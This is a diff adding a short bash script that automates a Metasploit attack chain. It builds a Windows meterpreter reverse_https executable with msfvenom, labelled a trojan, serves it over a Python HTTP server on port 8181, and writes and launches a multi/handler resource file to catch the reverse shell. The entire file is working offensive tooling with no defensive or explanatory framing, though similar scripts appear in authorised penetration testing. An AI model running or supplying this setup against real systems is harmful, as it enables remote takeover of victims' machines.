@@ -1,0 +1,28 @@
+#!/bin/bash
+
+# create a payload
+# start simpleHTTPserver
+# Start msfconsole
+
+if [ -z "$1" ]
+then
+echo "[!] No port given"
+exit
+fi
+
+L='listen.rc'
+#1 
+msfvenom -p windows/meterpreter/reverse_https lhost=$(hostname -I) lport=$1 -f exe > $1.exe
+echo "[*] Generated $1 trojans"
+
+#2
+python3 -m http.server 8181 &
+echo "[*]SimpleHTTPServer running on port 8181"
+#3
+echo "use exploit/multi/handler" > $L
+echo "set payload windows/meterpreter/reverse_https" >> $L
+echo "set lhost $(hostname -I)" >> $L
+echo "set lport $1" >> $L
+echo "exploit" >> $L
+
+msfconsole -q -r  $L
